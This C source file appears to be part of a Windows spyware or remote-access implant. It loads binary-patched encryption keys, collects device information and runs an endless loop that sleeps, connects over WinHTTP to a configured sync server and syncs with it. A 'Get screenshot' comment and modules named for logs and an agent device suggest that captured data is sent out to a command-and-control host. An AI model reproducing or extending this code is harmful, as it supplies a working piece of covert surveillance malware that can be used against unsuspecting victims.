#include <Windows.h>

#include "sync_thread.h"
#include "binpatched_vars.h"
#include "agent_device.h"
#include "log_files.h"
#include "win_http.h"
#include "md5.h"
#include "proto.h"
#include "crypt.h"

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];

VOID SyncThreadFunction()
{
	ULONG pServerPort;
	BYTE pServerIp[32];

	memcpy(pServerKey, CLIENT_KEY, 32);
	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
	memcpy(pLogKey, ENCRYPTION_KEY, 32);

#ifdef _DEBUG_BINPATCH
	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
#endif

	GetDeviceInfo();

	while(1)
	{
		Sleep(SYNC_INTERVAL);
#ifdef _DEBUG
		OutputDebugString(L"[*] Starting sync...\n");
#endif

		// Get screenshot
		if (WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort))
		{
			SyncWithServer();
			WinHTTPClose();
		}
#ifdef _DEBUG
		else
			OutputDebugString(L"WinHTTPSetup FAIL\n");
#endif
	}
}

